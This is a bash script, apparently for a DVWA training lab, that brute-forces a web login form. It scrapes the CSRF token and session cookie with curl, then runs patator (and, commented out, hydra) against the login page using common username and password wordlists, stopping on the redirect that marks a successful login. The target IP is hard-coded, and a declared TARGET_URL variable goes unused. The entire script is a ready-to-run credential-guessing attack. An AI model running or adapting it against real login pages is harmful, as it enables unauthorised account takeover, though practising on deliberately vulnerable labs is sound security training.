#!/bin/bash
# SETUP: Change this to your targets IP
TARGET_URL="10.10.215.78"

CSRF=$(curl -s -c dvwa.cookie "192.168.1.44/DVWA/login.php" | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2)
SESSIONID=$(grep PHPSESSID dvwa.cookie | awk -F ' ' '{print $7}')

#hydra  -L /usr/share/seclists/Usernames/top_shortlist.txt  -P /usr/share/seclists/Passwords/500-worst-passwords.txt \
#  -e ns  -F  -u  -t 1  -w 10  -V  192.168.1.44  http-post-form \
#  "/DVWA/login.php:username=^USER^&password=^PASS^&user_token=${CSRF}&Login=Login:S=Location\: index.php:H=Cookie: security=impossible; PHPSESSID=${SESSIONID}"

patator  http_fuzz  method=POST  follow=0  accept_cookie=0 --threads=1  timeout=10 \
  url="http://192.168.1.44/DVWA/login.php" \
  1=/usr/share/seclists/Usernames/top_shortlist.txt  0=/usr/share/seclists/Passwords/500-worst-passwords.txt \
  body="username=FILE1&password=FILE0&user_token=${CSRF}&Login=Login" \
  header="Cookie: security=impossible; PHPSESSID=${SESSIONID}" \
  -x quit:fgrep=index.php
